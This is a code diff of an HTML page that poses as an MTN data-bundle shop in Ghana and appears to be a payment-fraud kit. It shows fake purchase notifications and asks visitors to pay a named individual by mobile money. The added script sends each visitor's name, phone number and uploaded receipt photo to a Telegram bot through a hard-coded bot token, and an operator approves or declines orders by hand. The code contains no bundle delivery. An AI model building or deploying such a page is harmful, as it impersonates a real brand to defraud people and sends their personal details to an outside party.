@@ -5,278 +5,95 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>MTN Data Hub - Premium Data Services</title>
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap');
-
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
+        * { margin: 0; padding: 0; box-sizing: border-box; text-decoration: none; }
         :root {
-            --mtn-yellow: #FFCC00;
-            --mtn-blue: #003399;
-            --mtn-dark: #001a4d;
-            --text-primary: #001a4d;
-            --text-secondary: #475569;
-            --bg-body: #F8FAFC;
-            --success: #10B981;
-            --radius-lg: 24px;
-            --radius-md: 16px;
+            --mtn-yellow: #FFCC00; --mtn-blue: #003399; --mtn-dark: #001a4d;
+            --text-primary: #001a4d; --text-secondary: #475569; --bg-body: #F8FAFC;
+            --success: #10B981; --error: #EF4444; --radius-lg: 24px;
             --shadow-lg: 0 20px 25px -5px rgba(0, 0, 0, 0.1);
         }
-
-        body {
-            font-family: 'Inter', -apple-system, sans-serif;
-            background: var(--bg-body);
-            color: var(--text-primary);
-            line-height: 1.6;
-            min-height: 100vh;
-            display: flex;
-            flex-direction: column;
-        }
-
-        header {
-            background: white;
-            padding: 16px 24px;
-            position: sticky;
-            top: 0;
-            z-index: 1000;
-            border-bottom: 4px solid var(--mtn-yellow);
-            box-shadow: 0 2px 10px rgba(0,0,0,0.05);
-        }
-
-        .header-container {
-            max-width: 1200px;
-            margin: 0 auto;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-        }
-
-        .logo { display: flex; align-items: center; gap: 12px; text-decoration: none; }
+        body { font-family: 'Inter', sans-serif; background: var(--bg-body); color: var(--text-primary); min-height: 100vh; display: flex; flex-direction: column; }
+        header { background: white; padding: 16px 24px; position: sticky; top: 0; z-index: 1000; border-bottom: 4px solid var(--mtn-yellow); box-shadow: 0 2px 10px rgba(0,0,0,0.05); }
+        .header-container { max-width: 1200px; margin: 0 auto; display: flex; justify-content: space-between; align-items: center; }
+        .logo { display: flex; align-items: center; gap: 12px; cursor: pointer; }
         .logo-img { width: 44px; height: 44px; object-fit: contain; border-radius: 8px; }
-        .logo-text { font-size: 20px; font-weight: 900; color: var(--mtn-blue); }
-
+        .logo-text { font-size: 20px; font-weight: 700; color: var(--mtn-blue); }
         main { flex: 1; max-width: 1200px; margin: 0 auto; width: 100%; padding: 40px 24px; }
-
-        /* UNIVERSAL SOCIAL PROOF - PILL STYLE */
-        .notification-container {
-            position: fixed;
-            top: 100px;
-            right: 24px;
-            z-index: 9999;
-            pointer-events: none;
-        }
-
-        @media (max-width: 640px) {
-            .notification-container {
-                top: 80px;
-                left: 50%;
-                transform: translateX(-50%);
-                width: calc(100% - 40px);
-                max-width: 350px;
-            }
-        }
-
-        .notification {
-            background: white;
-            border-radius: 50px;
-            padding: 10px 20px;
-            margin-bottom: 12px;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.15);
-            display: flex;
-            align-items: center;
-            gap: 12px;
-            animation: popIn 0.5s cubic-bezier(0.34, 1.56, 0.64, 1);
-            border: 1.5px solid rgba(16, 185, 129, 0.3);
-            pointer-events: auto;
-        }
-
-        @keyframes popIn {
-            0% { opacity: 0; transform: scale(0.8) translateY(-20px); }
-            100% { opacity: 1; transform: scale(1) translateY(0); }
-        }
-
-        .notification.exit {
-            animation: fadeOut 0.4s ease-in forwards;
-        }
-
-        @keyframes fadeOut {
-            to { opacity: 0; transform: scale(0.9) translateX(20px); }
-        }
-
+        .notification-container { position: fixed; top: 100px; right: 24px; z-index: 9999; pointer-events: none; }
+        @media (max-width: 640px) { .notification-container { top: 80px; left: 50%; transform: translateX(-50%); width: calc(100% - 40px); max-width: 350px; } }
+        .notification { background: white; border-radius: 50px; padding: 10px 20px; margin-bottom: 12px; box-shadow: 0 10px 30px rgba(0,0,0,0.15); display: flex; align-items: center; gap: 12px; animation: popIn 0.5s cubic-bezier(0.34, 1.56, 0.64, 1); border: 1.5px solid rgba(16, 185, 129, 0.3); pointer-events: auto; }
+        @keyframes popIn { 0% { opacity: 0; transform: scale(0.8) translateY(-20px); } 100% { opacity: 1; transform: scale(1) translateY(0); } }
+        .notification.exit { animation: fadeOut 0.4s ease-in forwards; }
+        @keyframes fadeOut { to { opacity: 0; transform: scale(0.9) translateX(20px); } }
         .notif-dot { width: 10px; height: 10px; background: var(--success); border-radius: 50%; }
-        .notif-text { font-size: 13px; font-weight: 700; color: var(--mtn-blue); white-space: nowrap; }
-
-        /* Hero Section */
-        .hero-section {
-            background: linear-gradient(135deg, var(--mtn-blue) 0%, var(--mtn-dark) 100%);
-            border-radius: var(--radius-lg);
-            padding: 80px 40px;
-            text-align: center;
-            color: white;
-            box-shadow: var(--shadow-lg);
-            margin-bottom: 60px;
-        }
-
+        .notif-text { font-size: 13px; font-weight: 500; color: var(--mtn-blue); white-space: nowrap; }
+        .hero-section { background: linear-gradient(135deg, var(--mtn-blue) 0%, var(--mtn-dark) 100%); border-radius: var(--radius-lg); padding: 80px 40px; text-align: center; color: white; box-shadow: var(--shadow-lg); margin-bottom: 60px; }
         .hero-logo { width: 120px; height: 120px; margin: 0 auto 32px; object-fit: contain; animation: float 6s ease-in-out infinite; }
         @keyframes float { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(-10px); } }
-        .hero-title { font-size: clamp(32px, 5vw, 56px); font-weight: 900; margin-bottom: 20px; letter-spacing: -1.5px; }
-        .hero-subtitle { font-size: clamp(16px, 3vw, 20px); opacity: 0.9; max-width: 600px; margin: 0 auto 40px; }
-        .btn-hero { background: var(--mtn-yellow); color: var(--mtn-blue); padding: 18px 48px; border-radius: 100px; font-size: 18px; font-weight: 800; border: none; cursor: pointer; transition: 0.3s; box-shadow: 0 10px 20px rgba(255, 204, 0, 0.3); }
-        .btn-hero:hover { transform: translateY(-3px); box-shadow: 0 15px 30px rgba(255, 204, 0, 0.4); }
-
-        /* Bundle Grid */
+        .hero-title { font-size: clamp(32px, 5vw, 56px); font-weight: 700; margin-bottom: 20px; }
+        .btn-hero { background: var(--mtn-yellow); color: var(--mtn-blue); padding: 18px 48px; border-radius: 100px; font-size: 18px; font-weight: 700; border: none; cursor: pointer; }
         .bundle-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(280px, 1fr)); gap: 32px; }
-        .bundle-card { background: white; border-radius: var(--radius-lg); padding: 48px 32px; text-align: center; transition: 0.4s; cursor: pointer; box-shadow: 0 10px 20px rgba(0,0,0,0.05); display: flex; flex-direction: column; border: 2px solid transparent; }
-        .bundle-card:hover { transform: translateY(-12px); box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.15); border-color: var(--mtn-yellow); }
-
+        .bundle-card { background: white; border-radius: var(--radius-lg); padding: 48px 32px; text-align: center; transition: 0.4s; cursor: pointer; box-shadow: 0 10px 20px rgba(0,0,0,0.05); display: flex; flex-direction: column; border: 2px solid transparent; position: relative; }
+        .bundle-card:hover { transform: translateY(-12px); border-color: var(--mtn-yellow); }
+        .card-logo { position: absolute; top: 16px; left: 16px; width: 24px; height: 24px; object-fit: contain; border-radius: 4px; }
         .bundle-badges { display: flex; gap: 8px; justify-content: center; margin-bottom: 24px; }
-        .bundle-badge { background: #FEF3C7; color: #92400E; padding: 6px 16px; border-radius: 100px; font-size: 11px; font-weight: 800; text-transform: uppercase; }
+        .bundle-badge { background: #FEF3C7; color: #92400E; padding: 6px 16px; border-radius: 100px; font-size: 11px; font-weight: 500; text-transform: uppercase; }
         .badge-no-expiry { background: #ECFDF5; color: #065F46; }
-
-        .bundle-data-value { font-size: 72px; font-weight: 900; color: var(--mtn-blue); line-height: 1; letter-spacing: -3px; margin: auto 0; }
-        .bundle-price { font-size: 24px; font-weight: 900; color: var(--mtn-blue); padding-top: 24px; border-top: 1px solid #f1f5f9; }
-
-        /* Forms & Cards */
+        .bundle-data-value { font-size: 72px; font-weight: 700; color: var(--mtn-blue); margin: auto 0; }
+        .bundle-price-row { font-size: 24px; font-weight: 700; color: var(--mtn-blue); padding-top: 24px; border-top: 1px solid #f1f5f9; display: flex; justify-content: space-between; align-items: center; }
+        .btn-buy { font-size: 14px; font-weight: 500; background: var(--mtn-blue); color: white; padding: 6px 14px; border-radius: 50px; }
         .app-card { background: white; border-radius: var(--radius-lg); padding: 48px; box-shadow: var(--shadow-lg); max-width: 600px; margin: 0 auto; }
         .form-group { margin-bottom: 24px; }
-        .form-label { display: block; font-weight: 700; margin-bottom: 8px; color: var(--mtn-blue); }
-        .form-input { width: 100%; padding: 16px; border: 2px solid #E2E8F0; border-radius: 16px; font-size: 16px; transition: 0.3s; }
-        .form-input:focus { border-color: var(--mtn-yellow); outline: none; }
-
-        /* Timer UI */
+        .form-label { display: block; font-weight: 500; margin-bottom: 8px; color: var(--mtn-blue); }
+        .form-input { width: 100%; padding: 16px; border: 2px solid #E2E8F0; border-radius: 16px; font-size: 16px; }
         .timer-box { text-align: center; margin-bottom: 40px; }
         .timer-circle-wrap { width: 160px; height: 160px; margin: 0 auto; position: relative; display: flex; align-items: center; justify-content: center; }
         .timer-svg { width: 160px; height: 160px; transform: rotate(-90deg); }
         .timer-bg { fill: none; stroke: #f1f5f9; stroke-width: 8; }
         .timer-bar { fill: none; stroke: var(--mtn-blue); stroke-width: 8; stroke-linecap: round; stroke-dasharray: 440; stroke-dashoffset: 0; transition: 1s linear; }
-        .timer-text { position: absolute; font-size: 28px; font-weight: 900; color: var(--mtn-blue); }
-
-        .btn-full { width: 100%; padding: 18px; border-radius: 16px; font-size: 18px; font-weight: 800; border: none; cursor: pointer; transition: 0.3s; }
+        .timer-text { position: absolute; font-size: 28px; font-weight: 700; color: var(--mtn-blue); }
+        .btn-full { width: 100%; padding: 18px; border-radius: 16px; font-size: 18px; font-weight: 700; border: none; cursor: pointer; transition: 0.3s; margin-bottom: 12px; }
         .btn-primary { background: var(--mtn-yellow); color: var(--mtn-blue); }
-        .btn-primary:hover { background: #EAB308; transform: translateY(-2px); }
-
+        .btn-outline { background: white; color: var(--mtn-blue); border: 2px solid var(--mtn-blue); }
         .state { display: none; }
         .state.active { display: block; animation: fadeIn 0.5s ease-out; }
         @keyframes fadeIn { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
-
         footer { background: white; padding: 60px 24px; text-align: center; border-top: 1px solid #E2E8F0; margin-top: 80px; }
     </style>
 </head>
 <body>
-
-    <header>
-        <div class="header-container">
-            <a href="#" class="logo" onclick="resetFlow()">
-                <img src="mtn_logo.jpg" class="logo-img" alt="Logo">
-                <span class="logo-text">MTN Data Hub</span>
-            </a>
-        </div>
-    </header>
-
+    <header><div class="header-container"><div class="logo" onclick="resetFlow()"><img src="mtn_logo.jpg" class="logo-img" alt="Logo"><span class="logo-text">MTN Data Hub</span></div></div></header>
     <div class="notification-container" id="notifContainer"></div>
-
     <main>
-        <!-- HERO -->
-        <div id="heroPage" class="state active">
-            <div class="hero-section">
-                <img src="mtn_logo.jpg" class="hero-logo" alt="MTN">
-                <h1 class="hero-title">Premium MTN Data Bundles</h1>
-                <p class="hero-subtitle">Experience the fastest automated data delivery system in Ghana. Trusted by thousands.</p>
-                <button class="btn-hero" onclick="showBundles()">View All Plans</button>
-            </div>
-        </div>
-
-        <!-- BUNDLES -->
-        <div id="bundlesPage" class="state">
-            <h2 style="text-align: center; font-weight: 900; color: var(--mtn-blue); margin-bottom: 48px; font-size: 32px;">Choose Your Bundle</h2>
-            <div class="bundle-grid" id="bundleGrid"></div>
-        </div>
-
-        <!-- PAYMENT -->
-        <div id="paymentPage" class="state">
-            <div class="app-card">
-                <h2 style="font-weight: 900; color: var(--mtn-blue); margin-bottom: 32px; font-size: 24px;">Enter Details</h2>
-                <div class="form-group">
-                    <label class="form-label">MTN Phone Number</label>
-                    <input type="tel" id="phoneInput" class="form-input" placeholder="024XXXXXXX" maxlength="10">
-                </div>
-                <div class="form-group">
-                    <label class="form-label">Account Name</label>
-                    <input type="text" id="nameInput" class="form-input" placeholder="Full name on MoMo">
-                </div>
-                <button class="btn-full btn-primary" onclick="startPayment()">PROCEED TO CASH-OUT</button>
-            </div>
-        </div>
-
-        <!-- PROCESSING -->
-        <div id="processingPage" class="state">
-            <div class="app-card">
-                <div class="timer-box">
-                    <div class="timer-circle-wrap">
-                        <svg class="timer-svg">
-                            <circle class="timer-bg" cx="80" cy="80" r="70"></circle>
-                            <circle class="timer-bar" id="timerBar" cx="80" cy="80" r="70"></circle>
-                        </svg>
-                        <div class="timer-text" id="timerDisplay">03:30</div>
-                    </div>
-                    <p style="font-weight: 900; margin-top: 32px; font-size: 18px; color: var(--mtn-blue);">AWAITING AUTHORIZATION...</p>
-                </div>
-
-                <div style="background: #FFF9E0; padding: 20px; border-radius: 16px; border: 2px solid var(--mtn-yellow); margin-bottom: 32px; text-align: center;">
-                    <p style="font-size: 13px; font-weight: 700; color: #92400E;">VERIFY RECIPIENT NAME:</p>
-                    <p style="font-size: 18px; font-weight: 900; color: var(--mtn-blue);">STEPHEN MENSAH ENTERPRISE</p>
-                </div>
-
-                <div class="form-group">
-                    <label class="form-label">Upload Receipt for Faster Verification</label>
-                    <div class="form-input" style="height: 160px; border-style: dashed; display: flex; align-items: center; justify-content: center; cursor: pointer; position: relative; overflow: hidden;" onclick="document.getElementById('fileInput').click()">
-                        <span id="upLabel">Click to Upload Proof</span>
-                        <img id="prevImg" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; object-fit: cover; display: none;">
-                    </div>
-                    <input type="file" id="fileInput" style="display: none;" onchange="handleFile(event)">
-                </div>
-            </div>
-        </div>
-
-        <!-- SUCCESS -->
-        <div id="successPage" class="state">
-            <div class="app-card" style="text-align: center; border-top: 8px solid var(--success);">
-                <div style="font-size: 64px; margin-bottom: 24px;">✅</div>
-                <h2 style="font-weight: 900; color: var(--mtn-blue); margin-bottom: 12px; font-size: 28px;">Order Approved!</h2>
-                <p style="color: var(--text-secondary); font-size: 16px;">Your data bundle will be delivered within 30 minutes.</p>
-                <button class="btn-full btn-primary" style="margin-top: 40px;" onclick="resetFlow()">Done</button>
+        <div id="heroPage" class="state active"><div class="hero-section"><img src="mtn_logo.jpg" class="hero-logo"><h1 class="hero-title">Premium MTN Data Bundles</h1><p class="hero-subtitle">Experience the fastest automated data delivery system in Ghana.</p><button class="btn-hero" onclick="showBundles()">View All Plans</button></div></div>
+        <div id="bundlesPage" class="state"><h2 style="text-align: center; margin-bottom: 48px;">Choose Your Bundle</h2><div class="bundle-grid" id="bundleGrid"></div></div>
+        <div id="paymentPage" class="state"><div class="app-card"><h2 style="margin-bottom: 32px;">Enter Details</h2><div class="form-group"><label class="form-label">MTN Phone Number</label><input type="tel" id="phoneInput" class="form-input" placeholder="024XXXXXXX" maxlength="10"></div><div class="form-group"><label class="form-label">Account Name</label><input type="text" id="nameInput" class="form-input" placeholder="Full name on MoMo"></div><button class="btn-full btn-primary" onclick="startPayment()">PROCEED TO CASH-OUT</button></div></div>
+        <div id="processingPage" class="state"><div class="app-card"><div class="timer-box"><div class="timer-circle-wrap"><svg class="timer-svg"><circle class="timer-bg" cx="80" cy="80" r="70"></circle><circle class="timer-bar" id="timerBar" cx="80" cy="80" r="70"></circle></svg><div class="timer-text" id="timerDisplay">03:30</div></div><p style="font-weight: 700; margin-top: 32px; font-size: 18px;">AWAITING AUTHORIZATION...</p></div><div style="background: #FFF9E0; padding: 20px; border-radius: 16px; border: 2px solid var(--mtn-yellow); margin-bottom: 32px; text-align: center;"><p style="font-size: 13px;">VERIFY RECIPIENT NAME:</p><p style="font-size: 18px; font-weight: 700;">STEPHEN MENSAH ENTERPRISE</p></div><div class="form-group"><label class="form-label">Please if you have approved payment, upload your receipt and get your bundle activated.</label><div class="form-input" style="height: 160px; border-style: dashed; display: flex; align-items: center; justify-content: center; cursor: pointer; position: relative; overflow: hidden;" onclick="document.getElementById('fileInput').click()"><span id="upLabel">Click to Upload Proof</span><img id="prevImg" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; object-fit: cover; display: none;"></div><input type="file" id="fileInput" style="display: none;" onchange="handleFile(event)"></div></div></div>
+        <div id="successPage" class="state"><div class="app-card" style="text-align: center;"><div style="font-size: 64px; margin-bottom: 24px;">✅</div><h2>Order Approved!</h2><p>Your bundle will be delivered within 30 minutes.</p><button class="btn-full btn-primary" style="margin-top: 40px;" onclick="resetFlow()">Done</button></div></div>
+        <div id="errorPage" class="state">
+            <div class="app-card" style="text-align: center; border-top: 8px solid var(--error);">
+                <div style="font-size: 80px; margin-bottom: 24px;">❌</div>
+                <h2 id="errorTitle" style="font-weight: 700; color: var(--mtn-blue); margin-bottom: 12px;">Payment Declined</h2>
+                <p id="errorMsg" style="color: var(--text-secondary); font-size: 16px; margin-bottom: 32px;">Please we have not received payment.</p>
+                <button class="btn-full btn-primary" onclick="showPage('paymentPage')">Try Cash Out Again</button>
+                <button class="btn-full btn-outline" onclick="resetFlow()">Home</button>
             </div>
         </div>
     </main>
-
-    <footer>
-        <p style="font-weight: 900; color: var(--mtn-blue); font-size: 18px;">MTN Data Hub</p>
-        <p style="font-size: 14px; color: var(--text-secondary); margin-top: 12px;">© 2026 MTN Data Hub. Fast. Secure. Reliable.</p>
-    </footer>
-
+    <footer><p style="font-weight: 700;">MTN Data Hub</p><p style="font-size: 14px; margin-top: 12px;">© 2026 MTN Data Hub. Fast. Secure. Reliable.</p></footer>
     <script>
-        const BUNDLES = [
-            { id: 1, data: '2GB', price: 12 }, { id: 2, data: '5GB', price: 25 },
-            { id: 3, data: '10GB', price: 50 }, { id: 4, data: '20GB', price: 100 },
-            { id: 5, data: '50GB', price: 200 }, { id: 6, data: '100GB', price: 350 }
-        ];
-
-        const SAMPLES = [
-            { p: '024 558 XXXX', b: '5GB' }, { p: '054 221 XXXX', b: '10GB' },
-            { p: '055 903 XXXX', b: '2GB' }, { p: '059 441 XXXX', b: '20GB' },
-            { p: '025 332 XXXX', b: '100GB' }
-        ];
-
-        window.onload = () => {
-            renderBundles();
-            startNotifs();
-        };
-
+        const CONFIG = { BOT_TOKEN: '8883385216:AAFj6cjQmV9kd7-wf6EZcSnlhuvLlO-PI88', CHAT_ID: '8889432014', TIMER: 210 };
+        const BUNDLES = [{ id: 1, data: '2GB', price: 12 }, { id: 2, data: '5GB', price: 25 }, { id: 3, data: '10GB', price: 50 }, { id: 4, data: '20GB', price: 100 }, { id: 5, data: '50GB', price: 200 }, { id: 6, data: '100GB', price: 350 }];
+        const SAMPLES = [{ p: '024 558 XXXX', b: '5GB' }, { p: '054 221 XXXX', b: '10GB' }, { p: '055 903 XXXX', b: '2GB' }, { p: '059 441 XXXX', b: '20GB' }, { p: '025 332 XXXX', b: '100GB' }];
+        let currentId = null, pollInterval = null, isNotifActive = true, timer = null, selectedBundle = null;
+        window.onload = () => { renderBundles(); startNotifs(); };
         function startNotifs() {
             const container = document.getElementById('notifContainer');
             const show = () => {
+                if (!isNotifActive) return;
                 const item = SAMPLES[Math.floor(Math.random() * SAMPLES.length)];
-                const n = document.createElement('div');
-                n.className = 'notification';
+                const n = document.createElement('div'); n.className = 'notification';
                 n.innerHTML = `<div class="notif-dot"></div><span class="notif-text">${item.p} just bought ${item.b} ✓</span>`;
                 container.appendChild(n);
                 setTimeout(() => { n.classList.add('exit'); setTimeout(() => n.remove(), 400); }, 4000);
@@ -284,66 +101,60 @@
             };
             setTimeout(show, 1000);
         }
-
         function renderBundles() {
             const grid = document.getElementById('bundleGrid');
-            grid.innerHTML = BUNDLES.map(b => `
-                <div class="bundle-card" onclick="selectBundle(${b.id})" style="position: relative;">
-                    <img src="mtn_logo.jpg" style="position: absolute; top: 16px; left: 16px; width: 24px; height: 24px; object-fit: contain; border-radius: 4px;">
-                    <div class="bundle-badges">
-                        <div class="bundle-badge">Premium</div>
-                        <div class="bundle-badge badge-no-expiry">No Expiry ∞</div>
-                    </div>
-                    <div class="bundle-data-value">${b.data}</div>
-                    <div class="bundle-price" style="display: flex; justify-content: space-between; align-items: center;">
-                        <span>GHS ${b.price}</span>
-                        <span style="font-size: 14px; background: var(--mtn-blue); color: white; padding: 6px 14px; border-radius: 50px;">Buy Now</span>
-                    </div>
-                </div>
-            `).join('');
+            grid.innerHTML = BUNDLES.map(b => `<div class="bundle-card" onclick="selectBundle(${b.id})"><img src="mtn_logo.jpg" class="card-logo"><div class="bundle-badges"><div class="bundle-badge">Premium</div><div class="bundle-badge badge-no-expiry">No Expiry ∞</div></div><div class="bundle-data-value">${b.data}</div><div class="bundle-price-row"><span>GHS ${b.price}</span><span class="btn-buy">Buy Now</span></div></div>`).join('');
         }
-
-        function selectBundle(id) { showPage('paymentPage'); }
+        function selectBundle(id) { selectedBundle = BUNDLES.find(b => b.id === id); showPage('paymentPage'); }
         function showBundles() { showPage('bundlesPage'); }
-
         function startPayment() {
-            const phone = document.getElementById('phoneInput').value;
-            const name = document.getElementById('nameInput').value;
-            if (phone.length !== 10 || !name) { alert('Please check details'); return; }
-            showPage('processingPage');
-            startTimer(210);
+            const phone = document.getElementById('phoneInput').value, name = document.getElementById('nameInput').value;
+            if (phone.length !== 10 || !name) { alert('Check details'); return; }
+            currentId = Date.now().toString(); isNotifActive = false; document.getElementById('notifContainer').innerHTML = '';
+            showPage('processingPage'); startTimer(CONFIG.TIMER);
+            const msg = `🚀 *NEW ORDER*\n👤 *Name:* ${name}\n📞 *Phone:* ${phone}\n📦 *Bundle:* ${selectedBundle.data}\n💰 *Price:* GHS ${selectedBundle.price}\n🆔 *ID:* ${currentId}`;
+            const kb = { inline_keyboard: [[{ text: '✅ Approve', callback_data: `approve_${currentId}` }, { text: '❌ Decline', callback_data: `decline_${currentId}` }]]};
+            fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ chat_id: CONFIG.CHAT_ID, text: msg, parse_mode: 'Markdown', reply_markup: kb }) });
+            startPolling();
         }
-
-        function startTimer(s) {
-            let left = s;
-            const bar = document.getElementById('timerBar');
-            const display = document.getElementById('timerDisplay');
-            const timer = setInterval(() => {
-                const m = Math.floor(left / 60);
-                const sec = left % 60;
-                display.textContent = `${String(m).padStart(2, '0')}:${String(sec).padStart(2, '0')}`;
-                bar.style.strokeDashoffset = 440 - (left / s) * 440;
-                if (--left < 0) { clearInterval(timer); resetFlow(); }
-            }, 1000);
+        function startPolling() {
+            let lastId = 0;
+            pollInterval = setInterval(() => {
+                fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/getUpdates?offset=${lastId + 1}`)
+                    .then(r => r.json()).then(data => {
+                        if (data.ok && data.result) {
+                            data.result.forEach(u => {
+                                lastId = u.update_id;
+                                if (u.callback_query && u.callback_query.data.includes(currentId)) {
+                                    clearInterval(pollInterval); clearInterval(timer);
+                                    if (u.callback_query.data.startsWith('approve')) { showPage('successPage'); } 
+                                    else { showError('Payment Declined', 'Please we have not received payment.'); }
+                                }
+                            });
+                        }
+                    });
+            }, 2000);
         }
-
         function handleFile(e) {
             const file = e.target.files[0];
             if (file) {
-                const prev = document.getElementById('prevImg');
-                prev.src = URL.createObjectURL(file);
-                prev.style.display = 'block';
-                document.getElementById('upLabel').style.display = 'none';
-                setTimeout(() => showPage('successPage'), 3000);
+                const prev = document.getElementById('prevImg'); prev.src = URL.createObjectURL(file); prev.style.display = 'block'; document.getElementById('upLabel').style.display = 'none';
+                const fd = new FormData(); fd.append('chat_id', CONFIG.CHAT_ID); fd.append('photo', file); fd.append('caption', `📸 *RECEIPT UPLOADED*\n📞 ${document.getElementById('phoneInput').value}\n🆔 ${currentId}`); fd.append('parse_mode', 'Markdown');
+                fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
             }
         }
-
-        function showPage(id) {
-            document.querySelectorAll('.state').forEach(s => s.classList.remove('active'));
-            document.getElementById(id).classList.add('active');
-            window.scrollTo(0,0);
+        function startTimer(s) {
+            let left = s; const bar = document.getElementById('timerBar'), display = document.getElementById('timerDisplay');
+            if (timer) clearInterval(timer);
+            timer = setInterval(() => {
+                const m = Math.floor(left / 60), sec = left % 60;
+                display.textContent = `${String(m).padStart(2, '0')}:${String(sec).padStart(2, '0')}`;
+                bar.style.strokeDashoffset = 440 - (left / s) * 440;
+                if (--left < 0) { clearInterval(timer); clearInterval(pollInterval); showError('Session Expired', 'The payment window has closed.'); }
+            }, 1000);
         }
-
+        function showError(title, msg) { document.getElementById('errorTitle').textContent = title; document.getElementById('errorMsg').textContent = msg; showPage('errorPage'); }
+        function showPage(id) { document.querySelectorAll('.state').forEach(s => s.classList.remove('active')); document.getElementById(id).classList.add('active'); window.scrollTo(0,0); }
         function resetFlow() { location.reload(); }
     </script>
 </body>
